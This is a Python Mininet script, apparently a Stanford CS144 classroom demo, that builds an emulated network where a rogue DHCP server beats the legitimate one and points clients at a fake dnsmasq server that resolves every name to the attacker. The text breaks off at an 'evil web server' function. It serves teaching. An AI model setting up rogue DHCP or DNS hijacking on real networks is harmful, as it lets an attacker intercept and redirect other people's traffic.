#!/usr/bin/env python3

"""
Rogue DHCP server demo for Stanford CS144.

We set up a network where the DHCP server is on a slow
link. Then we start up a rogue DHCP server on a fast
link which should beat it out (although we should look
at wireshark for the details.) This rogue DHCP server
redirects DNS to a rogue DNS server, which redirects
all DNS queries to the attacker. Hilarity ensues.

The demo supports two modes: the default interactive
mode (X11/firefox) or a non-interactive "text" mode
(text/curl).

We could also do the whole thing without any custom
code at all, simply by using ettercap.

Note you may want to arrange your windows so that
you can see everything well.
"""

from mininet.net import Mininet
from mininet.topo import Topo
from mininet.link import TCLink
from mininet.cli import CLI
from mininet.util import quietRun
from mininet.log import setLogLevel, info
from mininet.term import makeTerms
from mininet.examples.nat import connectToInternet, stopNAT

from sys import exit, stdin, argv
from time import sleep
import os

def checkRequired():
    "Check for required executables"
    required = ['udhcpd', 'udhcpc', 'dnsmasq', 'curl', 'firefox']
    for r in required:
        if not quietRun('which ' + r):
            print('* Installing', r)
            print(quietRun('apt-get install -y ' + r))
            if r == 'dnsmasq':
                # Don't run dnsmasq by default!
                print(quietRun('update-rc.d dnsmasq disable'))

class DHCPTopo(Topo):
    """Topology for DHCP Demo:
       client - switch - slow link - DHCP server
                  |
                attacker"""
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        client = self.addHost('h1', ip='10.0.0.10/24')
        switch = self.addSwitch('s1')
        dhcp = self.addHost('dhcp', ip='10.0.0.50/24')
        evil = self.addHost('evil', ip='10.0.0.66/24')
        self.addLink(client, switch)
        self.addLink(evil, switch)
        self.addLink(dhcp, switch, bw=10, delay='500ms')


# DHCP server functions and data

DNSTemplate = """
start        10.0.0.10
end          10.0.0.90
option       subnet 255.255.255.0
option       domain local
option       lease 7  # seconds
"""
# option dns 8.8.8.8
# interface h1-eth0

def makeDHCPconfig(filename, intf, gw, dns):
    "Create a DHCP configuration file"
    config = (
        'interface %s' % intf,
        DNSTemplate,
        'option router %s' % gw,
        'option dns %s' % dns,
        '')
    with open(filename, 'w') as f:
        f.write('\n'.join(config))

def startDHCPserver(host, gw, dns):
    "Start DHCP server on host with specified DNS server"
    info('* Starting DHCP server on', host, 'at', host.IP(), '\n')
    dhcpConfig = '/tmp/%s-udhcpd.conf' % host
    makeDHCPconfig(dhcpConfig, host.defaultIntf(), gw, dns)
    host.cmd('udhcpd -f', dhcpConfig,
             '1>/tmp/%s-dhcp.log 2>&1  &' % host)

def stopDHCPserver(host):
    "Stop DHCP server on host"
    info('* Stopping DHCP server on', host, 'at', host.IP(), '\n')
    host.cmd('kill %udhcpd')


# DHCP client functions

def startDHCPclient(host):
    "Start DHCP client on host"
    intf = host.defaultIntf()
    host.cmd('dhclient -v -d -r', intf)
    host.cmd('dhclient -v -d 1> /tmp/dhclient.log 2>&1', intf, '&')

def stopDHCPclient(host):
    host.cmd('kill %dhclient')

def waitForIP(host):
    "Wait for an IP address"
    info('*', host, 'waiting for IP address')
    while True:
        host.defaultIntf().updateIP()
        if host.IP():
            break
        info('.')
        sleep(1)
    info('\n')
    info('*', host, 'is now using',
          host.cmd('grep nameserver /etc/resolv.conf'))

# Fake DNS server

def startFakeDNS(host):
    "Start Fake DNS server"
    info('* Starting fake DNS server', host, 'at', host.IP(), '\n')
    host.cmd('dnsmasq -k -A /#/%s 1>/tmp/dns.log 2>&1 &' % host.IP())

def stopFakeDNS(host):
    "Stop Fake DNS server"
    info('* Stopping fake DNS server', host, 'at', host.IP(), '\n')
    host.cmd('kill %dnsmasq')

# Evil web server

def startEvilWebServer(host):
   
